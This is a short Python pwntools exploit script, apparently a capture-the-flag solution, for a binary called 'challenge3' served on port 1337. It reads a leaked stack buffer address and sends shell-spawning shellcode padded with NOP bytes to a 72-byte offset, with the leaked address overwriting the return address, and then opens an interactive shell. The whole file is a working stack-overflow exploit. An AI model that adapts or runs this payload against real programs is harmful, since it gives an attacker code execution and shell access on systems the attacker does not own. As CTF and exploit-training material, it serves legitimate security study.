#!/usr/bin/python3.8
import warnings
from pwn import *
from termcolor import colored
warnings.filterwarnings("ignore")
context.arch = "amd64"

fname = "./challenge3" 

LOCAL = False

prompt = ">"

def pwn():
  # Find the overflow offset
  offset = 72
  
  # Open a local process or a remote instance
  if LOCAL:
    r   = process(fname)
  else:
    r   = remote("0.0.0.0", 1337)

  # Read buffer address
  r.recvuntil("'Buffer' is: [") # junk lines
  buf = int(r.recvuntil("]", drop=True), 16) # Do not save "]" and convert value to integer
  print("\n[*] Buffer address @ 0x{:x}\n".format(buf))

  # Craft payload
  # Fill the buffer with shellcode + nop slides until the offest value + the buffer address
  payload = asm(shellcraft.popad() + shellcraft.sh()).ljust(offset, b"\x90")  + p64(buf)
  r.sendlineafter(">",  payload)

  # Get shell
  r.interactive()

if __name__ == "__main__":
  pwn()
